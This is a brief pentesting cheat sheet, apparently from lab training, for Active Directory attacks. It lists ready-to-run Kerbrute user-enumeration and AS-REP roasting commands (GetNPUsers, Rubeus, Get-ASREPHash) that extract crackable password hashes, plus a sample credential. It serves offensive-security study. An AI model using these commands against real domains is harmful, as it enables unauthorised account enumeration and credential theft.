<hr>
<b>Enumeration checklist</b>
<hr>
<ul>
<li>Password Policy readable</li>
<li>Kebrute-able</li>
</ul>

Account Takeover Checklist

<ul>
<li>Vulnerable to ASREP-Roasting</li>
</ul>

<hr>
<b>Cheatsheet</b>
<hr>

<b>Enumeration</b>

<b>Kebrute-ing users</b>

Kerbrute uses pre-authentication to check if a given list of users is valid on the system.

<ol>
  <li>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</li>
</ol>

  
Account takeover techniques


<b>ASREP-Roasting:</b>

Exploit technqiues:
<ol>
<li>python GetNPUsers.py CHANGEME.LOCAL/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast</li>
<li>python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast</li>
<li>.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]</li>
<li>Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</li>
</ol>

